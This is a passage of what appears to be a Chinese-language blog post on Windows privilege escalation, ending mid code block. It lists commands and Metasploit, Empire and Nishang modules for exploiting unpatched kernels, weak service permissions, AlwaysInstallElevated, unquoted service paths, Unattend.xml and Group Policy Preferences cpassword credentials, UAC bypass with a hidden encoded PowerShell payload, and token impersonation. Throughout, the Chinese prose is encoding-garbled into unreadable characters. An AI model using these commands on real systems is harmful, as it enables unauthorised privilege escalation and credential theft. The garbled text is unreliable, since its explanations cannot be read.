¸æº¢å‡ºæ¼æ´ææƒï¼Œæ•°æ®åº“ææƒï¼Œé”™è¯¯çš„ç³»ç»Ÿé…ç½®ææƒï¼Œç»„ç­–ç•¥é¦–é€‰é¡¹ææƒï¼ŒWebä¸­é—´ä»¶æ¼æ´ææƒï¼ŒDLLåŠ«æŒææƒï¼Œæ»¥ç”¨æœ€é«˜æƒé™ä»¤ç‰Œææƒï¼Œç¬¬ä¸‰æ–¹è½¯ä»¶/æœåŠ¡ææƒç­‰ã€‚</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806163424137.png" alt="image-20210806163424137"></p><h5 id="å†…æ ¸æº¢å‡ºæ¼æ´ææƒ"><a href="#å†…æ ¸æº¢å‡ºæ¼æ´ææƒ" class="headerlink" title="å†…æ ¸æº¢å‡ºæ¼æ´ææƒ"></a>å†…æ ¸æº¢å‡ºæ¼æ´ææƒ</h5><p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p><p><a href="https://github.com/lyshark/Windows-exploits">https://github.com/lyshark/Windows-exploits</a></p><p>å†…æ ¸æº¢å‡ºæ¼æ´ææƒæ˜¯ä¸€ç§é€šç”¨çš„ææƒæ–¹æ³•ï¼Œé€šå¸¸åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ç»•è¿‡ç³»ç»Ÿçš„æ‰€æœ‰å®‰å…¨é™åˆ¶ã€‚å¦‚æœç›®æ ‡ä¸»æœºæ²¡æœ‰åŠæ—¶å®‰è£…è¡¥ä¸ï¼Œå°±å¯ä»¥æ‰¾åˆ°ç›¸åº”çš„EXPææƒã€‚</p><p>æŸ¥çœ‹è¡¥ä¸åˆ—è¡¨ï¼š<code>systeminfo</code>  <code>wmic qfe get Caption,Description,HotFixID,Installedon0</code></p><p>æŸ¥è¯¢åˆ°è¡¥ä¸å®‰è£…æƒ…å†µåå¯ä»¥å»çœ‹å“ªäº›è¡¥ä¸æ¼è£…äº†ï¼Œç„¶åææƒã€‚</p><p><code>Windows Exploit Suggester</code>ï¼š<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a> è¿™ä¸ªå·¥å…·å°†ç³»ç»Ÿä»¥åŠå®‰è£…çš„è¡¥ä¸å’Œå¾®è½¯çš„æ¼æ´æ•°æ®åº“è¿›è¡Œæ¯”è¾ƒè¯†åˆ«å‡ºå¯èƒ½å¯¼è‡´æƒé™æå‡çš„æ¼æ´ï¼Œè€Œå…¶åªéœ€è¦ç›®æ ‡ç³»ç»Ÿçš„ä¿¡æ¯ã€‚</p><p>è¿™ä¸ªæ˜¯<a href="https://github.com/bitsadmin/wesng%E4%B8%8A%E9%9D%A2%E7%9A%84%E5%8D%87%E7%BA%A7%E7%89%88">https://github.com/bitsadmin/wesngä¸Šé¢çš„å‡çº§ç‰ˆ</a></p><p>Metasploitå†…ç½®äº†<code>local_exploit_suggester</code>æ¨¡å—ï¼Œç”¨äºå¿«é€Ÿè¯†åˆ«ç³»ç»Ÿä¸­å¯ä»¥è¢«åˆ©ç”¨çš„æ¼æ´ï¼›Powershellçš„Sherlockè„šæœ¬å¯ä»¥å¿«é€ŸæŸ¥æ‰¾å¯èƒ½ç”¨äºæœ¬åœ°æƒé™æå‡çš„æ¼æ´<a href="https://github.com/rasta-mouse/Sherlock%EF%BC%8C%E8%B0%83%E7%94%A8%E8%84%9A%E6%9C%AC%E5%90%8E%E5%8F%AF%E4%BB%A5%E6%90%9C%E7%B4%A2%E5%8D%95%E4%B8%AA%E6%BC%8F%E6%B4%9E%E4%B9%9F%E5%8F%AF%E4%BB%A5%E6%90%9C%E7%B4%A2%E6%89%80%E6%9C%89%E6%9C%AA%E5%AE%89%E8%A3%85%E7%9A%84%E8%A1%A5%E4%B8%81%E3%80%82">https://github.com/rasta-mouse/Sherlockï¼Œè°ƒç”¨è„šæœ¬åå¯ä»¥æœç´¢å•ä¸ªæ¼æ´ä¹Ÿå¯ä»¥æœç´¢æ‰€æœ‰æœªå®‰è£…çš„è¡¥ä¸ã€‚</a></p><h5 id="æ“ä½œç³»ç»Ÿé…ç½®é”™è¯¯"><a href="#æ“ä½œç³»ç»Ÿé…ç½®é”™è¯¯" class="headerlink" title="æ“ä½œç³»ç»Ÿé…ç½®é”™è¯¯"></a>æ“ä½œç³»ç»Ÿé…ç½®é”™è¯¯</h5><ol><li><p><strong>ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯</strong></p><ul><li>æœåŠ¡æœªè¿è¡Œï¼šæ”»å‡»è€…ä¼šä½¿ç”¨ä»»æ„æœåŠ¡æ¥æ›¿æ¢åŸæ¥çš„æœåŠ¡ï¼Œç„¶åé‡å¯æœåŠ¡</li><li>æœåŠ¡æ­£åœ¨è¿è¡Œå¹¶ä¸”æ— æ³•è¢«ç»ˆæ­¢ï¼šè¿™ä¸ªæ˜¯å¤§å¤šæ•°æ¼æ´åˆ©ç”¨åœºæ™¯ã€‚æ”»å‡»è€…é€šå¸¸ä¼šåˆ©ç”¨DLLåŠ«æŒæŠ€æœ¯å°è¯•é‡å¯æœåŠ¡æ¥ææƒ</li></ul><p>PowerUPï¼š<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1%EF%BC%8C%E7%94%A8%E6%9D%A5%E5%AF%BB%E6%89%BE%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E7%9A%84windows%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%EF%BC%9B">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1ï¼Œç”¨æ¥å¯»æ‰¾ç›®æ ‡æœºå™¨çš„windowsæœåŠ¡æ¼æ´ï¼›</a></p><p>Metasploitä¸­çš„æ¨¡å—æ˜¯service_permissionsï¼Œé€‰æ‹©â€AGGRESSIVEâ€é€‰é¡¹å¯ä»¥åˆ©ç”¨ç›®æ ‡æœºå™¨ä¸Šæ¯ä¸€ä¸ªæœ‰ç¼ºé™·çš„æœåŠ¡ï¼Œè¯¥é€‰é¡¹è¢«ç¦ç”¨æ—¶ï¼Œæ¨¡å—åœ¨ç¬¬ä¸€æ¬¡ææƒæˆåŠŸåå°±ä¼šåœæ­¢å·¥ä½œ</p></li><li><p><strong>æ³¨å†Œè¡¨é”®</strong> <code>AlwaysInstallElevated</code></p><p>æ³¨å†Œè¡¨é”®<code>AlwaysInstallElevated</code>æ˜¯ä¸€ä¸ªç­–ç•¥è®¾ç½®å‘ï¼ŒWindowså…è®¸ä½æƒé™ç”¨æˆ·ä»¥Systemæƒé™è¿è¡Œå®‰è£…æ–‡ä»¶ï¼Œå¦‚æœå¯ç”¨æ­¤ç­–ç•¥è®¾ç½®é¡¹ï¼Œé‚£ä¹ˆä»»ä½•ä½æƒé™ç”¨æˆ·éƒ½èƒ½ä»¥NT AUTHORITY\SYSTEMæƒé™æ¥å®‰è£…æ¶æ„çš„MSIæ–‡ä»¶</p><p><code>PathAlwaysInstallElevated</code>æ¼æ´äº§ç”Ÿçš„åŸå› æ˜¯ç”¨æˆ·å¼€å¯äº†Windows Installerç‰¹æƒå®‰è£…åŠŸèƒ½ã€‚Windows Installeræ˜¯windowsçš„ç»„ä»¶ä¹‹ä¸€ï¼Œä¸“é—¨ç”¨æ¥ç®¡ç†å’Œé…ç½®è½¯ä»¶æœåŠ¡ã€‚å®ƒé™¤äº†æ˜¯ä¸€ä¸ªå®‰è£…ç¨‹åºï¼Œè¿˜ç”¨äºç®¡ç†è½¯ä»¶çš„å®‰è£…ï¼Œç®¡ç†è½¯ä»¶ç»„ä»¶çš„æ·»åŠ å’Œåˆ é™¤ï¼Œç›‘è§†æ–‡ä»¶çš„è¿˜åŸï¼Œé€šè¿‡å›æ»šè¿›è¡Œç¾éš¾æ¢å¤ç­‰ã€‚Windows Installeråˆ†ä¸ºå®¢æˆ·ç«¯å®‰è£…æœåŠ¡ï¼ˆMsiexec.exeï¼‰å’ŒMSIæ–‡ä»¶ä¸¤éƒ¨åˆ†ï¼Œä»–ä»¬æ˜¯ä¸€èµ·å·¥ä½œçš„ï¼ŒWindows Installeré€šè¿‡Msiexec.exeå®‰è£…MSIæ–‡ä»¶åŒ…å«ç¨‹åºï¼ŒMSIæ–‡ä»¶æ˜¯Windows Installerçš„æ•°æ®åŒ…ï¼Œå®ƒå®é™…ä¸Šæ˜¯ä¸€ä¸ªæ•°æ®åº“ï¼ŒåŒ…å«å®‰è£…å’Œå¸è½½è½¯ä»¶æ˜¯éœ€è¦ä½¿ç”¨çš„å¤§é‡æŒ‡ä»¤å’Œæ•°æ®ã€‚ç®€å•æ¥è¯´ï¼ŒåŒå‡»MSIæ–‡ä»¶å°±å¯ä»¥è¿è¡ŒMsiexec.exe</p><p>PowerUpçš„<code>Get-RegistryAlwaysInstallerElevated</code>æ¨¡å—ç”¨æ¥æ£€æµ‹æ³¨å†Œè¡¨é”®æ˜¯å¦è¢«è®¾ç½®ï¼Œå¦‚æœ<code>AlwaysInstallElevated</code>å·²ç»è¢«è®¾ç½®å°±è¡¨æ˜äº†MSIæ–‡ä»¶æ˜¯ä»¥Systemæƒé™è¿è¡Œçš„ï¼ˆTrueè¡¨ç¤ºå·²ç»è¢«è®¾ç½®ï¼‰</p><p>ä¸ªäººç†è§£ï¼šè¿™ä¸ªæ¼æ´å°±æ˜¯åˆ©ç”¨MSIè¿è¡Œæ—¶æƒé™é—®é¢˜æ¥é€ æˆææƒ</p></li><li><p><strong>å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´</strong></p><p>åˆ©ç”¨äº†windowsæ–‡ä»¶è·¯å¾„è§£æçš„ç‰¹æ€§ï¼Œå¦‚æœä¸€ä¸ªæœåŠ¡çš„<strong>å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„æ²¡æœ‰è¢«åŒå¼•å·å¼•èµ·æ¥ä¸”åŒ…å«ç©ºæ ¼</strong>ï¼Œé‚£ä¹ˆè¿™ä¸ªæœåŠ¡å°±æ˜¯æœ‰æ¼æ´çš„</p><ul><li>å¦‚æœè·¯å¾„å’ŒæœåŠ¡æœ‰å…³ï¼Œå°±å¯ä»¥ä»»æ„åˆ›å»ºä¸€ä¸ªæœåŠ¡æˆ–è€…ç¼–è¯‘Serviceæ¨¡æ¿</li><li>å¦‚æœè·¯å¾„å’Œå¯æ‰§è¡Œæ–‡ä»¶æœ‰å…³ï¼Œå°±å¯ä»¥ä»»æ„åˆ›å»ºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶</li></ul><p>å¯»æ‰¾æ¼æ´ï¼š<code>wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot; </code></p><p>éœ€è¦è¿›ä¸€æ­¥æ£€æµ‹ç›®æ ‡æ–‡ä»¶å¤¹çš„å†™æƒé™ï¼Œä½¿ç”¨windowså†…ç½®çš„å·¥å…·<code>icacls</code>ï¼š<code>icacls &quot;path&quot;</code></p><p>ç„¶åæŠŠä¸Šä¼ çš„ç¨‹åºé‡å‘½åæ”¾ç½®åœ¨æ­¤æ¼æ´ä¸”å¯å†™çš„ç›®å½•ä¸‹ï¼Œé‡å¯æœåŠ¡<code>sc stop service_name</code> <code>sc start service _name</code></p><p>MSFæ”»å‡»æ¨¡å— <code>exploit/windows/local/trusted_service_path</code>ï¼Œå®ƒä¼šè‡ªåŠ¨åå¼¹ä¸€ä¸ªæ–°çš„metertreterï¼ŒæŸ¥è¯¢æ˜¾ç¤ºææƒæˆåŠŸï¼Œä½†æ˜¯è¿™ä¸ªé“¾æ¥å¾ˆå¿«å°±ä¼šæ–­å¼€ï¼Œéœ€è¦åœ¨æ–­å¼€å‰è¿ç§»è¿›ç¨‹<code>set AutoRunScript migrate -f</code></p></li><li><p><strong>è‡ªåŠ¨å®‰è£…é…ç½®æ–‡ä»¶</strong></p><p>ç½‘ç»œç®¡ç†å‘˜åœ¨å†…ç½‘ç»™å¤šå°æœºå™¨é…ç½®åŒä¸€ç¯å¢ƒæ—¶ï¼Œé€šå¸¸ä¼šä½¿ç”¨è„šæœ¬åŒ–æ‰¹é‡éƒ¨ç½²ï¼Œè¿‡ç¨‹ä¸­ä¼šä½¿ç”¨å®‰è£…é…ç½®æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶ä¼šåŒ…å«ä¸€äº›æ•æ„Ÿä¿¡æ¯</p><p>æ–‡ä»¶æ£€æŸ¥ï¼š<code>dir /b /s c:\Unattend.xml</code></p><p>MSFæ”»å‡»æ¨¡å—ï¼š<code>post/windows/gather/enum_unattend</code></p></li><li><p><strong>è®¡åˆ’ä»»åŠ¡</strong></p><p>æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ï¼š<code>schtasks /query /fo LIST /v</code></p><p>AccessChkæ˜¯SysInteralså¥—ä»¶ä¸­çš„ä¸€ä¸ªå·¥å…·ï¼Œç”¨äºåœ¨windowsä¸­è¿›è¡Œä¸€äº›ç³»ç»Ÿæˆ–ç¨‹åºçš„é«˜çº§æŸ¥è¯¢ï¼Œç®¡ç†ï¼Œæ•…éšœæ’é™¤å·¥ä½œã€‚å®ƒæ˜¯å¾®è½¯å®˜æ–¹æä¾›çš„å·¥å…·ï¼Œä¸€èˆ¬ä¸ä¼šè¢«æ€æ¯’è½¯ä»¶å‘ç°ï¼Œä¸‹è½½ï¼š<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%94%BB%E5%87%BB%E8%80%85%E5%AF%B9%E4%BB%A5%E9%AB%98%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E7%9A%84%E4%BB%BB%E5%8A%A1%E7%9B%AE%E5%BD%95%E6%9C%89%E5%8F%AF%E5%86%99%E6%9D%83%E9%99%90%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A6%86%E7%9B%96%E5%8E%9F%E7%A8%8B%E5%BA%8F%E3%80%82">https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschkï¼Œå¦‚æœæ”»å‡»è€…å¯¹ä»¥é«˜æƒé™è¿è¡Œçš„ä»»åŠ¡ç›®å½•æœ‰å¯å†™æƒé™å°±å¯ä»¥åˆ©ç”¨æ¶æ„ç¨‹åºè¦†ç›–åŸç¨‹åºã€‚</a></p><p>æŸ¥çœ‹ç›®å½•æƒé™é…ç½®æƒ…å†µï¼š<code>accesschk.exe -dqv &quot;c:\Microsoft&quot; -accepteula</code></p><p>å…¶ä»–å¸¸ç”¨å‘½ä»¤</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript">accesschk.exe /accepteula  <span class="hljs-comment"># è‡ªåŠ¨æ¥å—è®¸å¯åè®®ï¼Œé¿å…å¼¹å‡ºå¯¹è¯æ¡†</span><br><br><span class="hljs-comment"># åˆ—å‡ºæŸä¸ªé©±åŠ¨ä¸‹æ‰€æœ‰æƒé™é…ç½®æœ‰ç¼ºé™·çš„æ–‡ä»¶å¤¹</span><br>accesschk.exe -uwdqsUsersc:<span class="hljs-string">\</span><br>accesschk.exe -uwqs<span class="hljs-string">&quot;AuthenticatedUsers&quot;</span>c:<span class="hljs-string">\</span><br><span class="hljs-comment"># åˆ—å‡ºæŸä¸ªé©±åŠ¨ä¸‹æ‰€æœ‰æƒé™é…ç½®æœ‰ç¼ºé™·çš„æ–‡ä»¶</span><br>accesschk.exe -uwdqsUsersc:<span class="hljs-string">\*.*</span><br>accesschk.exe -uwqs<span class="hljs-string">&quot;AuthenticatedUsers&quot;</span>c:<span class="hljs-string">\*.*</span><br></code></pre></td></tr></table></figure></li></ol><h5 id="ç»„ç­–ç•¥é¦–é€‰é¡¹æ"><a href="#ç»„ç­–ç•¥é¦–é€‰é¡¹æ" class="headerlink" title="ç»„ç­–ç•¥é¦–é€‰é¡¹æ"></a>ç»„ç­–ç•¥é¦–é€‰é¡¹æ</h5><p><strong>ç®€ä»‹</strong></p><p>SYSVOLæ˜¯æ´»åŠ¨ç›®å½•é‡Œé¢çš„ä¸€ä¸ªç”¨äºå­˜å‚¨åŸŸå…¬å…±æ–‡ä»¶æœåŠ¡å™¨å‰¯æœ¬çš„å…±äº«æ–‡ä»¶å¤¹ï¼Œåœ¨åŸŸä¸­çš„æ‰€æœ‰äºæ§åˆ¶å™¨ä¹‹é—´è¿›è¡Œå¤åˆ¶ã€‚SYSVOLæ–‡ä»¶å¤¹æ˜¯å®‰è£…æ´»åŠ¨ç›®å½•æ—¶è‡ªåŠ¨åˆ›å»ºçš„ï¼Œç”¨æ¥å­˜æ”¾ç™»å½•è„šæœ¬ï¼Œç»„ç­–ç•¥æ•°æ®ä»¥åŠå…¶å®ƒåŸŸæ§åˆ¶å™¨éœ€è¦çš„åŸŸä¿¡æ¯ã€‚SYSVOLåœ¨æ‰€æœ‰ç»è¿‡èº«ä»½éªŒè¯çš„åŸŸç”¨æˆ·æˆ–è€…åŸŸä¿¡ä»»ç”¨æˆ·å…·æœ‰è¯»æƒé™çš„æ´»åŠ¨ç›®å½•çš„åŸŸèŒƒå›´å†…å…±äº«ã€‚SYSVOLç›®å½•ä¸­æ‰€æœ‰çš„åŸŸæ§åˆ¶å™¨ä¸­æ˜¯è‡ªåŠ¨åŒæ­¥çš„ï¼Œæ‰€æœ‰åŸŸç­–ç•¥å‡å­˜æ”¾åœ¨<code>C:\Windows\SYSVOL\DOMAIN\Policies\</code>ä¸­</p><p>å¸¸è§çš„ç»„ç­–ç•¥é¦–é€‰é¡¹ï¼ˆGroup Policy Preferencesï¼ŒGPP)ï¼š</p><ul><li>æ˜ å°„é©±åŠ¨å™¨ï¼ˆDrives.xml )</li><li>åˆ›å»ºæœ¬åœ°ç”¨æˆ·</li><li>æ•°æ®æºï¼ˆDataSources.xml )</li><li>æ‰“å°æœºé…ç½®(Printers.xml )</li><li>åˆ›å»º/æ›´æ–°æœåŠ¡(ï¼ˆServices.xml )</li><li>è®¡åˆ’ä»»åŠ¡ï¼ˆScheduledTasks.xml )</li></ul><p><strong>è·å–ç»„ç­–ç•¥çš„å‡­æ®</strong></p><p>ç®¡ç†å‘˜åœ¨åŸŸä¸­æ–°å»ºä¸€ä¸ªç»„ç­–ç•¥åï¼Œæ“ä½œç³»ç»Ÿä¼šè‡ªåŠ¨åœ¨SYSVOLå…±äº«ç›®å½•ä¸­ç”Ÿæˆä¸€ä¸ªXMLæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¿å­˜äº†è¯¥ç»„ç­–ç•¥æ›´æ–°åçš„å¯†ç ã€‚è¯¥å¯†ç æ˜¯ä½¿ç”¨AES-256åŠ å¯†ç®—æ³•ï¼Œä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥è®¿é—®ä¿å­˜åœ¨XMLæ–‡ä»¶ä¸­çš„å¯†ç å¹¶è§£å¯†ï¼Œä»è€Œæ§åˆ¶åŸŸä¸­æ‰€æœ‰ä½¿ç”¨è¯¥è´¦æˆ·/å¯†ç çš„æœ¬åœ°ç®¡ç†å‘˜è®¡ç®—æœºã€‚åœ¨SYSVOLä¸­æœç´¢ï¼Œå¯ä»¥æ‰¾åˆ°åŒ…å«<code>cpassword</code>çš„XMLæ–‡ä»¶</p><ul><li><p>æ‰‹åŠ¨æŸ¥æ‰¾<code>cpassword</code></p></li><li><p>ä½¿ç”¨<code>Powershell</code>è·å–<code>cpassword</code></p><p>ç›®æ ‡ç³»ç»Ÿå¯¼å…¥Get-GPPPassword.ps1è„šæœ¬è·å–</p></li><li><p>ä½¿ç”¨MSFæŸ¥æ‰¾<code>cpassword</code></p><p>é€‰æ‹©ç›¸åº”çš„æ¨¡å—å³å¯</p></li><li><p>ä½¿ç”¨EmpireæŸ¥æ‰¾<code>cpassword</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">usemodule</span> privesc/gpp<br><span class="hljs-literal">info</span><br>execute<br></code></pre></td></tr></table></figure></li></ul><p>é™¤äº†Groups.xmlè¿˜æœ‰å‡ ä¸ªç»„ç­–ç•¥é¦–é€‰é¡¹æ–‡ä»¶ä¸­æœ‰å¯é€‰çš„cpassword å±æ€§</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Services\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Scrvices</span>.</span></span>xml<br>scheduledTasks\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ScheduledTasks</span>.</span></span>xml.<br>Printers\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Printers</span>.</span></span>xml<br>Drives\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Drives</span>.</span></span>xml<br>DataSources\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DataSources</span>.</span></span>xml<br></code></pre></td></tr></table></figure><h5 id="ç»•è¿‡UACææƒ"><a href="#ç»•è¿‡UACææƒ" class="headerlink" title="ç»•è¿‡UACææƒ"></a>ç»•è¿‡UACææƒ</h5><blockquote><p>UAC(User Account Control) åœ¨æ“ä½œå¯åŠ¨å‰å¯¹ç”¨æˆ·çš„èº«ä»½è¿›è¡ŒéªŒè¯ï¼Œé¿å…æ¶æ„è½¯ä»¶åœ¨è®¡ç®—æœºä¸Šæ‰§è¡Œå®‰è£…æ“ä½œæˆ–æ›´æ”¹è®¡ç®—æœºè®¾ç½®ï¼›å¾®è½¯è®¾ç½®äº†å®‰å…¨æ§åˆ¶ç­–ç•¥ï¼Œåˆ†ä¸ºé«˜ï¼Œä¸­ï¼Œä½ä¸‰ä¸ªç­‰çº§ï¼Œé«˜ç­‰çº§å…·æœ‰ç®¡ç†å‘˜æƒé™ï¼Œä¸­ç­‰çº§æœ‰æ™®é€šç”¨æˆ·æƒé™ï¼Œä½ç­‰çº§çš„æƒé™æ˜¯æœ‰é™çš„</p><p>UACæœ‰å››ç§è®¾ç½®è¦æ±‚ï¼š<br>1ã€å§‹ç»ˆé€šçŸ¥<br>2ã€ä»…åœ¨ç¨‹åºè¯•å›¾æ›´æ”¹æˆ‘çš„è®¡ç®—æœºæ—¶é€šçŸ¥æˆ‘ï¼ˆé»˜è®¤è®¾ç½®ï¼‰<br>3ã€ä»…åœ¨ç¨‹åºè¯•å›¾æ›´æ”¹æˆ‘çš„è®¡ç®—æœºæ—¶é€šçŸ¥æˆ‘ï¼ˆä¸é™ä½æ¡Œé¢çš„äº®åº¦ï¼‰<br>4ã€ä»ä¸æç¤º</p></blockquote><ul><li><p><strong>bypassuac</strong> æ¨¡å—</p><p>ä½¿ç”¨MSFçš„<code>bypassuac</code>æ¨¡å—çš„æ—¶å€™ï¼Œå½“å‰ç”¨æˆ·å¿…é¡»åœ¨ç®¡ç†å‘˜ç»„ä¸­ï¼Œä¸”UACä¸ºé»˜è®¤è®¾ç½®ï¼ˆå³ï¼šä»…åœ¨ç¨‹åºè¯•å›¾æ›´æ”¹æˆ‘çš„è®¡ç®—æœºæ—¶é€šçŸ¥æˆ‘ï¼‰ï¼Œbypassuacæ¨¡å—è¿è¡Œæ—¶ï¼Œä¼šåœ¨ç›®æ ‡æœºå™¨ä¸Šåˆ›å»ºå¤šä¸ªæ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶ä¼šè¢«æ€è½¯è¯†åˆ«ï¼Œä½†æ˜¯<code>bypassuac_injection</code>æ¨¡å—ç›´æ¥è¿è¡Œåœ¨å†…å­˜çš„åå°„DLLä¸­ï¼Œæ‰€ä»¥ä¸ä¼šæ¥è§¦ç›®æ ‡æœºå™¨çš„ç¡¬ç›˜ï¼Œè¢«æ£€æµ‹å‡ºæ¥çš„æ¦‚ç‡å°ã€‚</p></li><li><p><strong>RunAs</strong> æ¨¡å—</p><p>ä½¿ç”¨<code>exploit/windows/local/ask</code>æ¨¡å—ï¼Œåˆ›å»ºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œç›®æ ‡æœºå™¨ä¼šè¿è¡Œä¸€ä¸ªå‘èµ·æå‡æƒé™çš„è¯·æ±‚ç¨‹åºæç¤ºç”¨æˆ·æ˜¯å¦è¦ç»§ç»­è¿è¡Œï¼Œå¦‚æœç”¨æˆ·é€‰æ‹©ç»§ç»­è¿è¡Œï¼Œå°±ä¼šè¿”å›ä¸€ä¸ªé«˜æƒé™shellã€‚</p><p>æƒ³è¦æ‰§è¡ŒRunAsæ¨¡å—è¿›è¡Œææƒï¼Œå½“å‰ç”¨æˆ·å¿…é¡»åœ¨ç®¡ç†å‘˜ç»„æˆ–è€…çŸ¥é“ç®¡ç†å‘˜çš„å¯†ç ï¼Œå¯¹UACçš„è®¾ç½®æ²¡æœ‰è¦æ±‚ï¼Œä½¿ç”¨RunAsæ¨¡å—æ—¶éœ€è¦ä½¿ç”¨<code>EXE::Custom</code>é€‰é¡¹åˆ›å»ºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆéœ€è¦å…æ€å¤„ç†ï¼‰</p></li><li><p>Nishangä¸­çš„Invoke-PaUACmeæ¨¡å—</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">Invoke-PsUACme -Verbose # ä½¿ç”¨Sysprepæ–¹æ³•å¹¶æ‰§è¡Œé»˜è®¤çš„payload<br>Invoke-PsUACme -<span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-title">oobe</span> -<span class="hljs-title">Verbose</span> # ä½¿ç”¨<span class="hljs-title">oobe</span>æ–¹æ³•å¹¶æ‰§è¡Œé»˜è®¤çš„<span class="hljs-title">payload</span></span><br><span class="hljs-function"><span class="hljs-title">Invoke</span>-<span class="hljs-title">PsUACme</span> -<span class="hljs-title">method</span> <span class="hljs-title">oobe</span> -<span class="hljs-title">Verbose</span> -<span class="hljs-title">Payload</span> &quot;<span class="hljs-title">powershell</span> -<span class="hljs-title">windowstyle</span> <span class="hljs-title">hidden</span> -<span class="hljs-title">e</span> <span class="hljs-title">YourPayload</span>&quot;  # è‡ªå·±æŒ‡å®š<span class="hljs-title">payload</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">-<span class="hljs-title">PayloadPath</span> æŒ‡å®š<span class="hljs-title">payload</span>çš„è·¯å¾„</span><br><span class="hljs-function">-<span class="hljs-title">CustomDll64</span> æˆ– -<span class="hljs-title">CustomDll32</span> å¯ä»¥è‡ªå®šä¹‰<span class="hljs-title">DLL</span>æ–‡ä»¶</span><br></code></pre></td></tr></table></figure></li><li><p>Empireä¸­çš„bypassuacæ¨¡å—</p><ul><li><p>bypassuacæ¨¡å—</p><p>åœ¨Empireä¸­è¾“å…¥<code>usemodule privesc/bypassuac</code> è®¾ç½®ç›‘å¬å‚æ•°ï¼Œæ‰§è¡Œ <code>execute</code>å°±å¯ä»¥è·å¾—æ–°çš„shellï¼Œä½¿ç”¨listæŸ¥çœ‹ï¼Œå¸¦æ˜Ÿå·ï¼ˆ*ï¼‰å°±è¡¨ç¤ºææƒæˆåŠŸ</p></li><li><p>bypassuac_wscriptæ¨¡å—</p><p>æ¨¡å—å¤§è‡´åŸç†å°±æ˜¯ä½¿ç”¨<code>C:\Windows\wscript.exe</code>æ‰§è¡Œ<code>Payload</code>ç»•è¿‡UACï¼Œé€‚ç”¨äºWin7ï¼ŒæŸ¥çœ‹å¸¦æ˜Ÿå·ï¼ˆ*ï¼‰å°±è¡¨ç¤ºææƒæˆåŠŸ</p></li></ul></li></ul><h5 id="ä»¤ç‰Œçªƒå–"><a href="#ä»¤ç‰Œçªƒå–" class="headerlink" title="ä»¤ç‰Œçªƒå–"></a>ä»¤ç‰Œçªƒå–</h5><blockquote><p>ä»¤ç‰Œæ˜¯æŒ‡ç³»ç»Ÿä¸­çš„ä¸´æ—¶å¯†é’¥ï¼Œç›¸å½“äºè´¦æˆ·å’Œå¯†ç ï¼Œç”¨äºå†³å®šæ˜¯å¦å…è®¸å½“å‰è¯·æ±‚åŠåˆ¤æ–­å½“å‰è¯·æ±‚çš„æ˜¯å“ªä¸ªè´¦æˆ·ï¼Œä»¤ç‰Œå°†æŒç»­å­˜åœ¨äºç³»ç»Ÿä¸­ï¼ˆé™¤éç³»ç»Ÿé‡å¯ï¼‰</p></blockquote><p>ä¼ªé€ ä»¤ç‰Œæ”»å‡»çš„æ ¸å¿ƒæ˜¯<code>Kerberos</code>åè®®</p><p>MSFè·å–ä»¤ç‰Œ</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-keyword">use</span> incognito <br>list_tokens -u <span class="hljs-comment"># åˆ—å‡ºå¯ç”¨çš„token ä»¤ç‰Œçš„æ•°é‡å–å†³äºMSFshellçš„çº§åˆ«</span><br>impersonate_token ä»¤ç‰Œ <span class="hljs-comment"># 